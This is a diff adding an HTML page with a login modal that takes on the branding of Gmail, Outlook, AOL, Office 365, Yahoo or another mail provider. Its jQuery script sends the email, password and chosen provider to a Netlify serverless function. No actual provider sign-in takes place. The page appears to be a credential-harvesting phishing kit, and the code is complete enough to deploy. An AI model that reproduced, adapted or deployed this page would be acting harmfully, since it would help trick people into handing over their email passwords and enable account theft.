@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <!-- Meta tags, CSS links, and other head elements here -->
+</head>
+<body>
+  <!-- HTML content here -->
+
+  <!-- Modal for email login -->
+  <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body">
+          <center>
+            <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
+            <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+            <div class="alert alert-danger" id="msg"></div>
+          </center>
+          <form id="contact" class="form-horizontal well">
+            <div class="col-lg-12">
+              <div class="form-group">
+                <label for="exampleInputEmail1">Email address</label>
+                <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
+                <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+              </div>
+            </div>
+            <div class="col-lg-12">
+              <div class="form-group">
+                <label for="Password">Password</label>
+                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
+              </div>
+            </div>
+          </div>
+          <div class="modal-footer">
+            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+            <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- JavaScript, jQuery, and Bootstrap JS links here -->
+
+  <script>
+    $(document).ready(function(){
+      var count=0;
+
+      // Handle modal triggers
+      $('#gmailmodal').click(function () { showModal('images/gmail.png', 'Gmail'); });
+      $('#outlookmodal').click(function () { showModal('images/outlook.png', 'Outlook'); });
+      $('#aolmodal').click(function () { showModal('images/aol.png', 'Aol'); });
+      $('#office365modal').click(function () { showModal('images/office365.png', 'Office 365'); });
+      $('#yahoomodal').click(function () { showModal('images/yahoo.png', 'Yahoo'); });
+      $('#othermodal').click(function () { showModal('images/othermail.ico', 'Other Mail'); });
+
+      function showModal(imgSrc, field) {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', imgSrc);
+        $('#field').html(field);
+        $('#ajaxModal').modal('show');
+      }
+
+      // Handle form submission
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var detail = $("#field").html();
+
+        $.ajax({
+          url: '/.netlify/functions/submit',
+          type: 'POST',
+          contentType: 'application/json',
+          data: JSON.stringify({ email: email, password: password, detail: detail }),
+          beforeSend: function(xhr){
+            $('#submit-btn').html('Verifying...');
+          },
+          success: function(response){
+            $("#msg").show();
+            if(response.signal == 'ok'){
+              $('#msg').html(response.msg);
+            } else {
+              $('#msg').html(response.msg);
+            }
+          },
+          error: function(){
+            $("#msg").show();
+            $('#msg').html("Please try again later");
+          },
+          complete: function(){
+            $('#submit-btn').html('Login');
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
